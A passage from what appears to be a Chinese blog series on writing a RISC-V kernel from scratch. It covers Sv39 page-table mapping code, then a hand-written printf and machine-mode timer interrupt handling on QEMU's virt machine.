href="%5Bhttps://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html#%E9%99%84%E5%BD%95%5D(https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html#%E9%99%84%E5%BD%95)">要么产生页错误，要么进行下一级别的页表访问，要么继续得到物理地址等</a>。哦，天哪这可太复杂了，我必须进行简化：</p><ul><li>忽略页错误</li><li>不要超级页，默认最后一级的 PTE 就是叶 PTE，其他的都是非叶 PTE</li></ul><p>这样的话，我们的代码复杂度会降低很多（当然我们以后会加上），我们先解决一下 PTE 转为页表起始地址的问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64 <span class="hljs-title function_">PTE2PA</span><span class="hljs-params">(uint64 pte)</span> &#123;<br>    <span class="hljs-keyword">return</span> (pte &gt;&gt; <span class="hljs-number">10</span>) &lt;&lt; PAGEOFF;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后再来解决一下遇到的 PTE 无效的问题，可能你会觉得遇到无效的 PTE 直接产生页错误不就好了的错觉。emmm……我们以后确实会这么干，但如果在建立内存分页的过程中也这么干的话，就有点灰色幽默了：你要建立一片内存的分页，首先要创建一个页表（PTE），还未创建的 PTE 当然是无效的（内存全 0 ），如果此时产生页错误，会让我们永远都无法建立这个新页表！我们应当：分配一个空闲页块，置相关的位域，记录其起始地址并将地址回填到相关的 PTE 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((table = (PageTable_t)kalloc()) == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">memset</span>(table, <span class="hljs-number">0</span>, PAGESIZE);<br>*pte = PA2PTE((uint64)table) | PTE_V;<br><br>uint64 <span class="hljs-title function_">PA2PTE</span><span class="hljs-params">(uint64 pa)</span> &#123;<br>    <span class="hljs-keyword">return</span> (pa &gt;&gt; PAGEOFF) &lt;&lt; <span class="hljs-number">10</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第 4 步，得到了叶 PTE 后就非常轻松了，只要把 PA 存到 PTE 就行了，页偏移量我们不需要手动赋值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PTE_t *p = get_virtaddr4physaddr(VA, PA);<span class="hljs-comment">// 获得到虚拟地址 VA 相应的 PTE</span><br>*p = ((pa &gt;&gt; PAGEOFF) &lt;&lt; <span class="hljs-number">10</span>) | PTE_V | PTE_X | PTE_R | PTE_W;<span class="hljs-comment">// 把物理地址 PA 的地址经偏移后放入 PTE，然后写入一些位</span><br></code></pre></td></tr></table></figure><h3 id="等值映射">等值映射</h3><p>为什么我们要实现对给定虚拟地址 VA 和物理地址 PA 建立映射关系，因为对某些特殊的物理地址，我们要求其虚拟地址的值与物理地址相同。这被称为等值映射。</p><p>等值映射就是虚拟地址的值与物理地址的值相同的情况。为什么要强调等值映射？如果大家还记得 UART 驱动程序的内容，那么应该不会忘记 <code>0x10000000</code> 开始就是 UART 的内存映射寄存器的位置了。在未分页时，我们访问的地址都是物理地址，然而分页后，监管者模式和用户模式下访问的地址就是虚拟地址了，如果没有等值映射，会导致最终访问的物理地址不再是 <code>0x10000000</code> ，程序也就无法运行下去了。那么，哪些地址需要等值映射呢？先不管那么多，要不就让所有用到的内存地址都等值映射吧。</p><h2 id="最后的实现">最后的实现</h2><p>好了说了这么多零零散散的内容，我们把所有的东西整合起来看一下吧。</p><p>首先是空闲页块链表，在使用前，必须先初始化，把空闲页块全部串起来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">initmm</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> *p = (<span class="hljs-type">char</span>*)KERNEND;<br>    FreePage_t *pt;<br>    <span class="hljs-keyword">for</span>(; p &gt;= (<span class="hljs-type">char</span>*)KERNBASE; p -= PAGESIZE) &#123;<br>        pt = (FreePage_t *)p;<br>        pt-&gt;next = kmem;<br>        kmem = pt;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后，就是页表的等值映射问题，先分配出一个页表，然后再使用 <code>map</code> 函数，它可以将给定的物理地址和虚拟地址联系在一起，在一开始，我们不分三七二十一，直接把用到的所有地址都进行等值映射。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">initmm</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>    kernel_pagatable = (PageTable_t)kalloc();<br>    <span class="hljs-built_in">memset</span>(kernel_pagatable, <span class="hljs-number">0</span>, PAGESIZE);<br>    <span class="hljs-built_in">map</span>(kernel_pagatable, <span class="hljs-number">0x2000000</span>, <span class="hljs-number">0x2000000</span>, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br>    <span class="hljs-built_in">map</span>(kernel_pagatable, <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x100</span>, PTE_R | PTE_W);<br>    <span class="hljs-built_in">map</span>(kernel_pagatable, <span class="hljs-number">0x80000000</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-number">0x100000</span>, PTE_X | PTE_R | PTE_W);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>map</code> 函数的实现要难很多，大家要细看<a href="#VAPA">虚拟地址与物理地址</a>，函数从第三级页表开始，一步一步地找到虚拟地址对应的叶 PTE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">PTE_t *<span class="hljs-title function_">virt2phys</span><span class="hljs-params">(PageTable_t table, uint64 va)</span> &#123;<br>    <span class="hljs-type">int</span> level;<br>    PTE_t *pte;<br>    <span class="hljs-keyword">for</span>(level = <span class="hljs-number">2</span>; level &gt; <span class="hljs-number">0</span>; level--) &#123;<br>        pte = &amp;table[get_pagenum(level, va)];<br>        <span class="hljs-keyword">if</span> (*pte &amp; PTE_V) &#123;<br>            <span class="hljs-keyword">if</span> (*pte &amp; PTE_R || *pte &amp; PTE_X) &#123;<span class="hljs-comment">// valid</span><br>                <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// leaf</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// non-leaf</span><br>                table = (PageTable_t)PTE2PA(*pte);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> ((table = (PageTable_t)kalloc()) == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-built_in">memset</span>(table, <span class="hljs-number">0</span>, PAGESIZE);<br>            *pte = PA2PTE((uint64)table) | PTE_V;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> &amp;table[get_pagenum(level, va)];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">map</span><span class="hljs-params">(PageTable_t table, uint64 va, uint64 pa, uint64 size, uint64 mode)</span> &#123;<br>    uint64 pgstart = page_aligndown(va);<br>    uint64 pglast = page_aligndown(va + size<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">for</span>(; pgstart &lt;= pglast; pgstart += PAGESIZE, pa += PAGESIZE) &#123;<br>        PTE_t *p = virt2phys(table, pgstart);<br>        *p = ((pa &gt;&gt; PAGEOFF) &lt;&lt; <span class="hljs-number">10</span>) | PTE_V | mode;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>virt2phys</code> 函数中：</p><ol><li><code>pte = &amp;table[get_pagenum(level, va)]</code> 利用偏移量找到对应的 PTE 。</li><li><code>if (*pte &amp; PTE_V)</code> 判断是否有效。</li><li><code>if (*pte &amp; PTE_R || *pte &amp; PTE_X)</code> 判断是否为叶 PTE 。</li><li>如果无效，需要重新分配出一个页，并且将页的地址放入到 PTE 中。</li><li>最终，返回叶 PTE 。</li></ol><p>最后，不要忘记打开内存分页“开关”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">csrw satp, (8L &lt;&lt; 60) | (KERNBASE &gt;&gt; 12)<br>sfence.vma zero, zero<br></code></pre></td></tr></table></figure><p>最终，为了方便大家理解虚拟内存和物理内存的分布，我特意画了一幅图。在我的设计中，UART CLINT 等设备的内存映射寄存器的所在地都是等值映射，在未启动分页前的函数也应当在等值映射的范围内，这是方便启动分页后这些函数无需进行重新映射也可以被找到。</p><center><img src="/img/pagingmem.png" /></center><h2 id="一些疑问">一些疑问</h2><p>博主在实现内存分页时遇到过很多问题，经过思考后将某些问题的回答记录在此，方便自己和大家更好地理解内存分页机制。</p><p>当我注意到 RISC-V 64 支持的分页模式有 Sv39 Sv48 后，我发现 RV64 的分页模式至少有三级分页，而 QEMU 提供的 <code>virt</code> 机器内存大小只有 128 MB ，这难道不会在页表上浪费很大的空间么？经计算我发现，空间占用确实比二级页表、一级页表要大，但不需要很担心空间的问题。事实上在虚拟内存有 128 MB 时，三级页表只有一个 PTE ，因此只存在一个二级页表，而二级页表的 PTE 也只有 64 个，意味着有 64 个一级页表，总共 66 个页表，每个页表占 4 KiB，因此只需要 264 KiB 。相比 128 MB 的物理内存空间，无需担心。我们真正需要担心的是页内空间的浪费，因为我们现在只实现了基于页的内存分配，如在处理 C 语言中 <code>malloc(8)</code>  时也只能分配给 4 KiB 的内存，太不合理了，我们需要实现基于字节的内存分配。这里留个坑，我们可以在进程实现之后再来处理这个问题。</p><p>虚拟地址可以比物理地址大么？确实可以，不同的虚拟地址可以映射到同一个物理地址，实现代码/数据的共享。</p><p>到底哪些地址必须使用等值映射？博主经过多次实验，发现目前我们所写的代码/数据几乎都需要等值映射。在 RISC-V 64 中，机器模式使用物理地址，而监管者模式、用户模式使用虚拟地址，我认为只要在机器模式下确定的地址，且需要在监管者模式下使用的，基本都需要等值映射，包括程序代码、全局 section 、UART 等等。</p><h2 id="接下来">接下来</h2><p>之前我打算攻克下一个难题——进程。但在做初步调研后，发现做进程之前，先完成内核分页可能更加合适。然后我就一头栽进了内核分页这个大坑。弄懂内核分页并实现确实不容易，有很多地方仍需要自己慢慢学习。那么，接下来，我们需要好好消化一下学到的东西，整理一下日益凌乱的文件夹，然后一鼓作气，向进程进军！</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 6</title>
    <link href="/2020/08/17/2020-8-17-riscv-from-scratch-6/"/>
    <url>/2020/08/17/2020-8-17-riscv-from-scratch-6/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 6</h1><p>接上一篇<a href="https://dingfen.github.io/risc-v/2020/08/06/riscv-from-scratch-5.html">博客</a>，我今天继续写 <em>RISC-V from scratch</em> 系列博客。原本我打算将该<a href="https://github.com/twilco/riscv-from-scratch">英文系列</a>全部翻译成中文，但原作者貌似没有把这一系列完成就咕咕了，<strong>因此本文的内容是我自己实践的内容，以及一些自己的想法，放在这里同大家探讨，算是狗尾续貂，弥补遗憾</strong>。</p><h2 id="简介">简介</h2><p>欢迎再次来到 <em>RISC-V from scratch</em> ，先快速回顾一下我们之前做过的内容，我们之前已经介绍了 RISC-V 的特权架构以及几个重要的寄存器，在更久以前，我们还介绍了一些相关底层概念（例如编译、链接、原语运行时、汇编等）。具体来说，在上一篇文章中，我们在 <strong>UART</strong> 驱动程序的基础上，写了一个自己的链接器脚本，将数据安放在了合适的位置，我们还完善了 <code>boot.s</code> 文件，为中断程序处理做好了准备。为了使我们更好地利用驱动程序，并进一步做到进程并发、调度等，在这篇博客中，我将介绍：</p><ul><li><code>printf</code> 等工具类函数的实现</li><li>在机器模式中实现对时钟中断的处理</li><li>将时钟中断处理程序放到监管者模式下</li></ul><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><h2 id="往期回顾">往期回顾</h2><p>在正式内容开始前，我们先来看看上次实验进行到哪里了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> sg[] = <span class="hljs-string">&quot;hello world!&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">102</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> sl = <span class="hljs-number">105</span>;<br>    uartinit();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        uartputc(sg[i]);<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/run_5.png" alt=""></p><p>不错，我们已经可以熟练地使用驱动程序打印字符串了！但是，我们仍然不满足于此，我们最终的期望，一定是和其他机器一样，可以在 C 语言中使用 <code>printf</code> 等函数将字符打印出来。此外，实现了 <code>printf</code> 函数，也可以让我们调试更加方便（所谓的 <code>printf</code> 大法🤪），对中断处理程序的实现有一定帮助。</p><h2 id="工具类函数库">工具类函数库</h2><p>虽然我们即将实现的这些工具类函数都可以在 C/C++ 的库函数里面找到，不需要自己重复造轮子，但既然 <em>RISC-V from scratch</em> 这一系列的初衷就是从零开始完成 RISC-V 内核，那么博主还是要头铁地试一试的。对这一部分不感兴趣的读者，可以直接跳过啦。</p><p>首先，新建一个文件取名 <code>print.c</code> ，再根据 <a href="http://www.cplusplus.com/reference/cstdio/printf/">C/C++ 中的规定</a>，对 <code>printf</code> 函数定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @param fmt the string format</span><br><span class="hljs-comment"> * @return return length of written chars if success </span><br><span class="hljs-comment"> */</span> <br><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果大家对 C 语言中的可变参数语法不是很熟悉，那么建议看看<a href="https://www.runoob.com/cprogramming/c-variable-arguments.html">菜鸟教程</a>或者 <a href="https://www.geeksforgeeks.org/variable-length-argument-c/">GeeksforGeeks</a>。</p><p>考虑到今后的应用前景和代码结构，博主一并实现了 <code>vsprintf</code> 和 <code>sprintf</code> 函数，以及<code>strcpy</code>、<code>strlen</code> 等函数，但目前只实现了 <code>%d %x %s</code> 等。出于篇幅原因，只展示一些核心代码，其他的工具类函数实现都比较简单，就不罗嗦了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @param s  output string after replacement</span><br><span class="hljs-comment"> * @param fmt input string format</span><br><span class="hljs-comment"> * @param arg the variable arguments</span><br><span class="hljs-comment"> * @return the length of output string s</span><br><span class="hljs-comment"> */</span> <br><span class="hljs-type">int</span> <span class="hljs-title function_">vsprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> * s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * fmt, va_list arg)</span> &#123;<br><span class="hljs-comment">// ...</span><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; (fmt[i] &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>; i++) &#123;<br>        c = fmt[i];<br>        <span class="hljs-comment">// char put</span><br>        <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;%&#x27;</span>) &#123;<br>            s[j++] = fmt[i];  <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// %d %x %s and %% </span><br>            d = fmt[++i] &amp; <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">switch</span> (d) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>                tmp = va_arg(arg, <span class="hljs-type">int</span>);<br>                tmp = itoa(tmp, tmpstr, <span class="hljs-number">10</span>);<br>                <span class="hljs-built_in">strcpy</span>(&amp;s[j], tmpstr);<br>                j += tmp;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>                tmp = va_arg(arg, <span class="hljs-type">int</span>);<br>                tmp = itoa(tmp, tmpstr, <span class="hljs-number">16</span>);<br>                <span class="hljs-built_in">strcpy</span>(&amp;s[j], tmpstr);<br>                j += tmp;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>                pt = va_arg(arg, <span class="hljs-type">char</span>*);<br>                <span class="hljs-built_in">strcpy</span>(&amp;s[j], pt);<br>                j += <span class="hljs-built_in">strlen</span>(pt);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>: s[j++] = <span class="hljs-string">&#x27;%&#x27;</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>说一个小细节，整数的打印有两种进制可供选择，将整数转为相应的字符串是通过 <code>int itoa(int num, char *str, int base)</code> 函数实现的。该函数也不难实现。<code>printf</code> 函数就很容易了，只要把参数转换为相应的类型，再调用 <code>vsprintf</code> 函数和 <code>uartputc</code> 函数就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @param fmt the string format</span><br><span class="hljs-comment"> * @return return length of written chars if success </span><br><span class="hljs-comment"> */</span> <br><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span> &#123;<br>    va_list va;<br>    <span class="hljs-type">int</span> i, len;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">1024</span>];<br>    va_start(va, fmt);<br>    len = <span class="hljs-built_in">vsprintf</span>(str, fmt, va);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>        uartputc(str[i]);<br>    va_end(va);<br>    <span class="hljs-keyword">return</span> len;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="时钟中断">时钟中断</h2><h3 id="知识预备">知识预备</h3><p>到这里，如果大家仍不熟悉 RISC-V 特权架构，特别是中断处理的相关知识的话，就要好好补补了：</p><ul><li><a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a></li><li><a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a></li><li><a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a></li></ul><p>其中，官方的 RISC-V 特权指令集手册解释最为详尽，推荐英文好的读者仔细读一下相关内容。</p><p>关于时钟中断，它是中断的三种来源之一，触发中断的条件非常简单：在相关中断使能全打开的情况下，当 <code>mtime</code> 寄存器中的值大于或等于 <code>mtimecmp</code> 寄存器中的值时，就会触发时钟中断。值得注意的是，在机器模式下，只有当 <code>mtimecmp</code> 寄存器被重新写入后，<code>mip</code> 寄存器中的时钟中断标志位才会被清除。因此，每次处理时钟中断，都不能忘记更新 <code>mtimecmp</code> 。</p><blockquote><p><em>Platforms provide a 64-bit <strong>memory-mapped machine-mode</strong> timer compare register (<em><strong>mtimecmp</strong></em>), which causes a timer interrupt to be posted when the</em> <strong>mtime</strong> <em>register contains a value greater than or equal to the value in the</em> <strong>mtimecmp</strong> <em>register.</em></p><p>The <strong>MTIP</strong> bit is read-only and is cleared by writing to the <strong>memory-mapped machine-mode timer compare register (mtimecmp)</strong>.</p></blockquote><p>这里我要好好解释一下什么是 <strong>memory-mapped machine-mode</strong> 寄存器。如果你详细读过 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a> 和 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>，那么你一定发现上面引用中提到的寄存器 <code>mtime</code> 和 <code>mtimecmp</code> 都不在 CSR 寄存器表中，它们是 memory-mapped（内存映射）寄存器，意味着他们存在于机器内存的某个位置。由<a href="http://www.ittc.ku.edu/~heechul/courses/eecs388/lab6.pdf">网上的资料</a>得知，在 QEMU 提供的 virt 机器中，时钟中断事实上是由一个叫 CLINT 的外部中断设别产生的，在 <code>virt</code> 机器中，<code>mtime</code> 的内存地址是 <code>0x200bff8</code>，<code>mtimecmp</code> 的内存地址是 <code>0x2004000</code> 。</p><h3 id="mtvec-寄存器"><code>mtvec</code> 寄存器</h3><p>回顾一下 <a href="https://dingfen.github.io/risc-v/2020/08/06/riscv-from-scratch-5.html"><em>RISC-V from Scratch</em> 5 </a>和 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>，其中都提到了<code>mtvec</code> 寄存器，它的作用是存储处理程序的基址。很显然我们即将写的时钟中断处理程序就应当在此，注意，<code>mtvec</code> 寄存器要求中断处理程序地址 4 字节对齐。好，万事俱备，只欠东风。首先，新建一个文件取名 <code>mtrap.s</code> ，然后定义符号 <code>mtrap_vector </code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.global mtrap_vector<br>.section .text<br>.align 4<br>mtrap_vector:<br></code></pre></td></tr></table></figure><p>那么，我们该使用 <code>mtvec</code> 寄存器的哪一种寻址方式呢？其实都可以，简单点地，使用直接寻址，所有的中断/异常的处理都会跳转到这里；使用间接寻址，中断和异常就会分开，略显复杂但更易理解。</p><p>博主在实验时两个方式都用过了，我就介绍一下间接寻址吧。所有的中断处理程序的开始地址在 <code>mtrap_vector</code> 处形成数组，机器模式的时钟中断（中断编号为 7，因此在第 8 个）直接跳转到 <code>mtimer</code> 处。由于其他中断我们还没写，这就直接用 <code>nop</code> 语句代替了😅。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.global mtrap_vector<br>.section .text<br>.align 4<br>mtrap_vector:<br>    nop                     # User Software Interrupt<br>    nop                     # Supervisor software Interrupt<br>    nop                     # <br>    nop                     # Machine software Interrupt<br>    nop                     # User timer Interrupt<br>    nop                     # Supervisor timer Interrupt<br>    nop                     #<br>    j    mtimer             # Machine timer Interrupt<br></code></pre></td></tr></table></figure><h3 id="中断处理程序">中断处理程序</h3><p>在 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>中，我们已经知道了发生中断/异常时，机器的行动过程。那么在中断处理程序中，我们到底需要做什么呢？如果大家学过本科的<a href="http://staff.ustc.edu.cn/~llxx/cod/reference_books/tang.pdf">计算机组成原理</a>的话，那么应该知道这些：</p><ul><li>保存现场</li><li>完成中断服务</li><li>恢复现场</li><li>返回主函数</li></ul><p><strong>保存现场</strong>，就是说当程序因为中断从正常运行的程序切换到中断处理程序后，为不打扰正常程序的运行，第一件事情就是将所有的寄存器值和之前的 PC 值都保存下来，以便日后恢复。RISC-V 在响应中断时就自动帮我们把 PC 值保存在了<code>mepc</code> 寄存器中，但其余寄存器的值是需要我们自己保存的。我们可以将所有的寄存器值都保存在栈中，也可以给 <code>mscratch</code> 寄存器分配一定空间，然后将值保存在那里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mtimer:    <br>    addi sp, sp, -32<br>    sd   a0, 0(sp)<br>    sd   a1, 8(sp)<br>    sd   a2, 16(sp)<br>    sd   a3, 24(sp)<br>    # ...<br></code></pre></td></tr></table></figure><p><strong>中断服务</strong>，就是具体处理中断的程序啦。首先，我们可以通过 <code>mcause</code> 寄存器判断一下这是不是我们要处理的中断，然后就可以调用打印函数打印一句话，证明中断程序已经执行了。哦，不能忘记每次时钟中断处理都要更新 <code>mtimecmp</code> 寄存器，否则时钟中断信号就不会被清除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nasm">    # get the cause of interrupt or exception<br>    # to make sure it is mtimer<br>    csrr a1, mcause<br>    andi a1, a1, 0x3f   # get the last 7 bit<br>    li   a2, 7          # mtimer interrupt is 7<br>    beq  a1, a2, 1f<br>    j    3f<br>1:<br>    # handle timer interrupt<br>    # add mtimecmp<br>    la   a1, 0x2004000<br>    ld   a2, 0(a1)<br>    li   a3, 2000000<br>    add  a2, a2, a3<br>    sd   a2, 0(a1)<br>    <br>    call printime<br></code></pre></td></tr></table></figure><p><strong>恢复现场</strong>，到此为止中断程序就快做完了，马上要准备返回正常运行的程序了。我们需要把之前保存的寄存器值全部恢复过来。由于篇幅原因，我只写出了部分寄存器的保存和恢复，但保险起见，我们最好保存所有的寄存器。在程序的最后，使用 <code>mret</code> 语句将 <code>mepc</code> 